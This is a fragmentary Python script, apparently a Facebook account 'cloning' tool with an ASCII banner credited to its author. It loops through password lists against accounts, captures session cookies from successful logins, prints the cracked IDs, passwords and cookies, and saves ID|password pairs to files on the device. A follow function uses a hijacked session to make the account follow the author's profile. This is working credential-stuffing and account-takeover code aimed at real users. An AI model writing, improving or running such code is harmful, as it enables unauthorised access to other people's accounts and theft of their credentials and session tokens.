...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/mueid.mursalinrifat.5', {
...
██║░░██║██║██║░░░░░██║░░██║░░░██║░░░
╚═╝░░╚═╝╚═╝╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░
\033[1;94m[+]\033[1;32m               CREATED BY   :  Mueid Mursalin Rifat                 \033[1;94m[+]
\033[1;94m[+]\033[1;32m               ON GITHUB    :  Rifat1haker                       \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL VERSION :  1.0.1                             \033[1;94m[+]
\033[1;94m[+]\033[1;32m               NETWORK      :   3G,4G,5G                           \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL STATUS  :  FREE                            \033[1;94m[+]
\033[1;94m[+]\033[1;32m               TOOL'S NAME  :  RANDOM Cloning Tool                 \033[1;94m[+]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(RIFAT-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RIFAT -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(RIFAT-OK 💚)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIFAT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[RIFAT] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
